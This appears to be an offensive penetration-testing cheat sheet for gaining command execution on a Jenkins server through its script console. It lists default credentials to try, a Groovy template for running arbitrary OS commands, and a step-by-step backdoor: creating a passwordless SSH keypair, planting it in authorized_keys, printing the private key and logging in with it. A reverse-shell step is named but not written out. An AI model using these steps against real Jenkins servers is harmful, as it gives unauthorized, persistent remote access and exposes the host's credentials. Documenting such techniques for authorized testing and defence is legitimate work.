## Requirements: Access to a jenkins dashboard and script console

## Steps:

#### 1) Authenticate to the Jenkins instance. Try common credentials like: (jenkins:jenkins)

#### 2) Dashboard

#### 3) Manage Jenkins

#### 4) Script Console

#### 5) Setup listener

#### 6) Run a groovy reverse shell script

# Alternate Method: Create SSH Key-pair for SSH Access (Requires SSH port being open, and use this in case the reverse shell doesn't work)

## Command running template:

    def proc = "id".execute() (Replace the "id" value with any OS Command)

    def b = new StringBuffer()

    proc.consumeProcessErrorStream(b)

    println proc.text

    println b.toString()

## Command Steps:

#### 1) Show working directory

    pwd 

#### 2) Verify the home location of our user

    env 

#### 3) Build an .ssh directory

    mkdir .ssh 

#### 4) Create SSH keypair for our user. THE PASSPHRASE IS: ""

    ssh-keygen -t rsa -b 4096 -N \"\" -f .ssh/id_rsa 

#### 5) Copy the public SSH key to create the "authorized_keys" file

    cp .ssh/id_rsa.pub .ssh/authorized_keys 

#### 6) Print the private key to copy locally

    cat .ssh/id_rsa 

#### 7) Attacker: Give the correct permissions to use the key

    chmod 600 id_rsa 

#### 8) Attacker: SSH into the target user using the key

    ssh -i id_rsa USER@IP 
